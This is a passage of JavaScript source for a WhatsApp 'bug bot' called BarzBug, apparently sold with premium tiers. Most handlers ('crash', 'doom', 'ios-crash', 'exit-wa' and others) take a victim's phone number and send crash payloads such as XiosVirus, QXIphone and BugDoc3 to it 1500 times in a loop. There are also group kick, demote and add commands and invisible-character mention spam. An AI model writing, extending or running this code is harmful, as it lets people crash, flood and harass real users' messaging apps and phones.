          let v233 = (q ? q : "") + "\n‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎ \n";
          for (let v234 of v32) {
            v233 += "⊝ @" + v234.id.split("@")[0] + "\n";
          }
          BarzBug.sendMessage(m.chat, {
            text: v233,
            mentions: v32.map(p98 => p98.id)
          }, {
            quoted: m
          });
        }
        break;
      case "kicnsnsk":
        {
          if (!v24) {
            return vF6(global.onlygroup);
          }
          if (!v39 && !v46) {
            return vF6(global.onlyadmin);
          }
          if (!v36) {
            return vF6(global.noadmin);
          }
          let v235 = m.quoted ? m.quoted.sender : v23.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          await BarzBug.groupParticipantsUpdate(m.chat, [v235], "remove").then(p99 => vF6(util.format(p99))).catch(p100 => vF6(util.format(p100)));
        }
        break;
      case "demotndndnde":
        {
          if (!v45) {
            return vF6(global.onlyprem);
          }
          if (!v24) {
            return vF6(global.onlygroup);
          }
          if (!v39 && !v46) {
            return vF6(global.onlyadmin);
          }
          if (!v36) {
            return vF6(global.noadmin);
          }
          let v236 = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : v23.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          await BarzBug.groupParticipantsUpdate(m.chat, [v236], "demote").then(p101 => vF6(util.format(p101))).catch(p102 => vF6(util.format(p102)));
        }
        break;
      case "promondnste":
        {
          if (!v24) {
            return vF6(global.onlygroup);
          }
          if (!v39 && !v46) {
            return vF6(global.onlyadmin);
          }
          if (!v36) {
            return vF6(global.noadmin);
          }
          let v237 = m.quoted ? m.quoted.sender : v23.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          await BarzBug.groupParticipantsUpdate(m.chat, [v237], "add").then(p103 => vF6(util.format(p103))).catch(p104 => vF6(util.format(p104)));
        }
        break;
      case "stickndnder":
      case "stikbsbser":
      case "shsbs":
        {
          if (!v46) {
            return vF6(global.onlyown);
          }
          if (!v15) {
            return vF6("`</> 𝚍𝚎𝚜𝚝𝚛𝚞𝚌𝚝𝚒𝚘𝚗𝚌𝚛𝚊𝚜𝚑𝚎 𝟷.𝟶` \n*send/𝘙𝘦𝘱𝘭𝘺 with image/𝘝𝘪𝘥𝘦𝘰/𝘎𝘪𝘧 along with 𝘤𝘢𝘱𝘵𝘪𝘰𝘯 " + (v18 + v20) + "*");
          }
          if (/image/.test(v22)) {
            let v238 = await v15.download();
            const v239 = {
              packname: global.packname,
              author: global.author
            };
            let v240 = await BarzBug.sendStimg(v14, v238, m, v239);
            await fs.unlinkSync(v240);
          } else if (/video/.test(v22)) {
            if ((v15.msg || v15).seconds > 11) {
              return vF6("`</> 𝚍𝚎𝚜𝚝𝚛𝚞𝚌𝚝𝚒𝚘𝚗𝚌𝚛𝚊𝚜𝚑𝚎𝚛 𝟷.𝟶` \n*send/𝘙𝘦𝘱𝘭𝘺 with image/𝘝𝘪𝘥𝘦𝘰/𝘎𝘪𝘧 along with 𝘤𝘢𝘱𝘵𝘪𝘰𝘯 " + (v18 + v20) + "*");
            }
            let v241 = await v15.download();
            const v242 = {
              packname: global.packname,
              author: global.author
            };
            let v243 = await BarzBug.sendStvid(v14, v241, m, v242);
            await fs.unlinkSync(v243);
          } else {
            vF6("`</> 𝚍𝚎𝚜𝚝𝚛𝚞𝚌𝚝𝚒𝚘𝚗𝚌𝚛𝚊𝚜𝚑𝚎𝚛𝟷.𝟶` \n*send/𝘙𝘦𝘱𝘭𝘺 with image/𝘝𝘪𝘥𝘦𝘰/𝘎𝘪𝘧 along with 𝘤𝘢𝘱𝘵𝘪𝘰𝘯 " + (v18 + v20) + "*");
          }
        }
        break;
        //case Sunday 29 Des     
      case "doom":
      case "die":
      case "crash":      
        if (!v45) {
          return vF6(global.onlyprem);
        }
        if (!q) {
          return vF6("`</> 𝚍𝚎𝚜𝚝𝚛𝚞𝚌𝚝𝚒𝚘𝚗𝚌𝚛𝚊𝚜𝚑𝚎𝚛𝟷.𝟶` \n*example" + (v18 + v20) + " 234xxxx*");
        }
        target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        vF6(global.bugrespon);
        for (let v243 = 0; v243 < 1500; v243++) {
          await Bugg2Barz(target, ptcp = false)
          await LocationBarz(target, v93)  
          await QXIphone(target);
          await BugDoc3(target);
          await LocationBarz(target, v93) 
          await Bugg2Barz(target, pick = false) 
          await AdminBarz(target, ptcp = false) 
        }
        await vF4(v52);
        break;
        case "pain":
      case "rest":
      case "calamity":
        if (!v45) {
          return vF6(global.onlyprem);
        }
        if (!q) {
          return vF6("`</> 𝚍𝚎𝚜𝚝𝚛𝚞𝚌𝚝𝚒𝚘𝚗𝚌𝚛𝚊𝚜𝚑𝚎𝚛𝟷.𝟶` \n*example" + (v18 + v20) + " 2349060266540*");
        }
        target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        vF6(global.bugrespon);
        for (let v243 = 0; v243 < 1500; v243++) {
          await CrashV2(target, Ptcp = false);
          await QXIphone(target);
          await BugDoc3(target);
          await XiosVirus(target);
          await XiosVirus(target);
        }
        await vF4(v52);
        break;
        case "fuck-u":
        if (!v45) {
          return vF6(global.onlyprem);
        }
        if (!q) {
          return vF6("`</> 𝚍𝚎𝚜𝚝𝚛𝚞𝚌𝚝𝚒𝚘𝚗𝚌𝚛𝚊𝚜𝚑𝚎𝚛𝟷.𝟶` \n*example" + (v18 + v20) + " 2349060266540*");
        }
        target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        vF6(global.bugrespon);
        for (let v243 = 0; v243 < 1500; v243++) {
          await Crashed(target);
          await AmbaTukam(target);
          await BugDoc3(target);
          await f4(target, v96, v103, v108);
          await AdminBarz(target, ptcp = false) 
        }
        await vF4(v52);
        break;
        
        //ios
      case "ios-crash":
        if (!v45) {
          return vF6(global.onlyprem);
        }
        if (!q) {
          return vF6("`</> 𝚍𝚎𝚜𝚝𝚛𝚞𝚌𝚝𝚒𝚘𝚗𝚌𝚛𝚊𝚜𝚑𝚎𝚛𝟷.𝟶` \n*example" + (v18 + v20) + " 2349060266540*");
        }
        target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        vF6(global.bugrespon);
        for (let v243 = 0; v243 < 1500; v243++) {
          await ioskeresh(target);
          await QXIphone(target);
          await BugDoc3(target);
          await XiosVirus(target);
          await XiosVirus(target);
        }
        await vF4(v52);
        break;             
      case "good-bye":
      case "exit-wa":            
        if (!v45) {
          return vF6(global.onlyprem);
        }
        if (!q) {
          return vF6("`𝚍𝚎𝚜𝚝𝚛𝚞𝚌𝚝𝚒𝚘𝚗𝚌𝚛𝚊𝚜𝚑𝚎𝚛𝟷.𝟶 /` \n*example " + (v18 + v20) + " 234xxx*");
        }
        target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        vF6(global.bugrespon);
        for (let v244 = 0; v244 < 1500; v244++) {
          await f7(target, v96, v103, v108);
          await f6(target, v96, v103, v108);
          await f21(target, v96, v103, v108);
          await f4(target, v96, v103, v108);
          await f3(target, v96, v103, v108);
          await QXIphone(target);
          await BugDoc3(target);
          await XiosVirus(target);
          await XiosVirus(target);          
          await f4(target, v96, v103, v108);
          await f7(target, v96, v103, v108);
          await Bugg2Barz(target, ptcp = false)
          await LocationBarz(target, v93)  
          await AdminBarz(target, ptcp = false) 
          await f6(target, v96, v103, v108);
        }
        await vF4(v52);
        break;
      case "trashnsnsn-fc":
      case "travabsbsb-r":
      case "unli-bsbsz":
        if (!v45) {
          return vF6(global.onlyprem);
        }
        if (!q) {
          return vF6("`</> 𝚍𝚎𝚜𝚝𝚛𝚞𝚌𝚝𝚒𝚘𝚗𝚌𝚛𝚊𝚜𝚑𝚎𝚛𝟷.𝟶` \n*example " + (v18 + v20) + " 2349060266540*");
        }
        target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        vF6(global.bugrespon);
        for (let v245 = 0; v245 < 1500; v245++) {
          await f7(target, v96, v103, v108);
          await f6(target, v96, v103, v108);
          await f10(target, v96, v103, v108);
          await f6(target, v96, v103, v108);
        }
        await vF4(v52);
        break;
      case "Trava-nsnsnsx":
        if (!v45) {
          return vF6(global.onlyprem);
        }
        if (!q) {
          return vF6("`</> 𝚍𝚎𝚜𝚝𝚛𝚞𝚌𝚝𝚒𝚘𝚗𝚌𝚛𝚊𝚜𝚑𝚎𝚛𝟷.𝟶` \n*example " + (v18 + v20) + " 2349060266540*");
        }
        target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        vF6(global.bugrespon);
        for (let v246 = 0; v246 < 1500; v246++) {
          await f7(target, v96, v103, v108);
          await f6(target, v96, v103, v108);
          await f10(target, v96, v103, v108);
          await f5(target, v96, v103, v108);
          await f3(target, v96, v103, v108);
          await f7(target, v96, v103, v108);
          await f6(target, v96, v103, v108);
        }
        await vF4(v52);
        break;
      case "doku-bundnsnsg":
        if (!v45) {
          return vF6(global.onlyprem);
        }
        if (!q) {
          return vF6("`</> 𝚍𝚎𝚜𝚝𝚛𝚞𝚌𝚝𝚒𝚘𝚗𝚌𝚛𝚊𝚜𝚑𝚎𝚛𝟷.𝟶` \n*example " + (v18 + v20) + " 2349060266540*");
        }
        target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        vF6(global.bugrespon);
        for (let v247 = 0; v247 < 1500; v247++) {
          await f7(target, v96, v103, v108);
          await f6(target, v96, v103, v108);
          await f10(target, v96, v103, v108);
          await f4(target, v96, v103, v108);
          await f5(target, v96, v103, v108);
          await f7(target, v96, v103, v108);
          await f6(target, v96, v103, v108);
        }
        await vF4(v52);
        break;
      case "☠️bsbs":
      case "🥶bdbs":
      case "🤡bsb":
      case "barz-vabsbsnszo":
      case "wantebsbsd-z":
        if (!v45) {
          return vF6(global.onlyprem);
        }
        if (!q) {
          return vF6("`</> 𝚍𝚎𝚜𝚝𝚛𝚞𝚌𝚝𝚒𝚘𝚗𝚌𝚛𝚊𝚜𝚑𝚎𝚛𝟷.𝟶` \n*example " + (v18 + v20) + " 2349060266540*");
        }
        target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        vF6(global.bugrespon);
        for (let v248 = 0; v248 < 1500; v248++) {
          await f7(target, v96, v103, v108);
          await f6(target, v96, v103, v108);
          await f10(target, v96, v103, v108);
          await f5(target, v96, v103, v108);
          await f21(target, v96, v103, v108);
          await f4(target, v96, v103, v108);
          await f7(target, v96, v103, v108);
          await f6(target, v96, v103, v108);
        }
        await vF4(v52);
        break;
      case "addowbsnsner":
      case "addonzbswn":
        if (!v46) {
          return vF6(global.onlyown);
        }
        if (!v21[0]) {
          return vF6("`</> 𝚍𝚎𝚜𝚝𝚛𝚞𝚌𝚝𝚒𝚘𝚗𝚌𝚛𝚊𝚜𝚑𝚎𝚛𝟷. 𝟶` \n*example " + (v18 + v20) + " 2349060266540*");
        }
        dikaown = q.split("|")[0].replace(/[^0-9]/g, "");
        let v249 = await BarzBug.onWhatsApp(dikaown + "@s.whatsapp.net");
        if (v249.length == 0) {
          return vF6(global.invalid);
        }
        v43.push(dikaown);
        fs.writeFileSync("./lib/database/owner.json", JSON.stringify(v43));
        vF6(`
\`</> 𝚍𝚎𝚜𝚝𝚛𝚞𝚌𝚝𝚒𝚘𝚗𝚌𝚛𝚊𝚜𝚑𝚎𝚛𝟷.𝟶\` 
*successfully added _${dikaown}_ *to the premium database*`);
        break;
      case "delownxnzner":
      case "delowbsbsnn":
        if (!v46) {
          return vF6(global.onlyown);
        }
        if (!v21[0]) {
          return vF6("`</> 𝚍𝚎𝚜𝚝𝚛𝚞𝚌𝚝𝚒𝚘𝚗𝚌𝚛𝚊𝚜𝚑𝚎𝚛𝟷.𝟶` \n*example " + (v18 + v20) + " 2349060266540*");
        }
        dikaown = q.split("|")[0].replace(/[^0-9]/g, "");
        unp = v43.indexOf(ya);
        v43.splice(unp, 1);
        fs.writeFileSync("./lib/database/owner.json", JSON.stringify(v43));
        vF6("`𝚍𝚎𝚜𝚝𝚛𝚞𝚌𝚝𝚒𝚘𝚗𝚌𝚛𝚊𝚜𝚑𝚎𝚛𝟷.𝟶` \n*successfully deleted _" + dikaown + "_ owner's database*");
        break;
      case "addpremium":
      case "addprem":
        {
          if (!v46) {
            return vF6(global.onlyown);
          }
          if (!v21[0]) {
            return vF6("`𝚍𝚎𝚜𝚝𝚛𝚞𝚌𝚝𝚒𝚘𝚗𝚌𝚛𝚊𝚜𝚑𝚎𝚛𝟷.𝟶` \n*example " + (v18 + v20) + " 2349060266540*");
          }
          dikaprem = q.split("|")[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          let v250 = await BarzBug.onWhatsApp(dikaprem);
          if (v250.length == 0) {
            return vF6(global.invalid);
          }
          v42.push(dikaprem);
          fs.writeFileSync("./lib/database/premium.json", JSON.stringify(v42));
          vF6("`𝚍𝚎𝚜𝚝𝚛𝚞𝚌𝚝𝚒𝚘𝚗𝚌𝚛𝚊𝚜𝚑𝚎𝚛𝟷.𝟶` \n*successfully added _" + dikaprem + "_ to the premium database*");
        }
        break;
      case "delpremium":
      case "delprem":
        {
          if (!v46) {
            return vF6(global.onlyown);
          }
          if (!v21[0]) {
            return vF6("`𝚍𝚎𝚜𝚝𝚛𝚞𝚌𝚝𝚒𝚘𝚗𝚌𝚛𝚊𝚜𝚑𝚎𝚛𝟷.𝟶]` \n*example " + (v18 + v20) + " 2349060266540*");
          }
          dikaprem = q.split("|")[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          unp = v42.indexOf(ya);
          v42.splice(unp, 1);
          fs.writeFileSync("./lib/database/premium.json", JSON.stringify(v42));
          vF6("`[𝚍𝚎𝚜𝚝𝚛𝚞𝚌𝚝𝚒𝚘𝚗𝚌𝚛𝚊𝚜𝚑𝚎𝚛𝟷.𝟶]` \n*successfully deleted _" + dikaprem + "_from the premium database *");
        }
        break;
      case "self":
        {
          if (!v46) {
            return vF6(global.onlyown);
          }
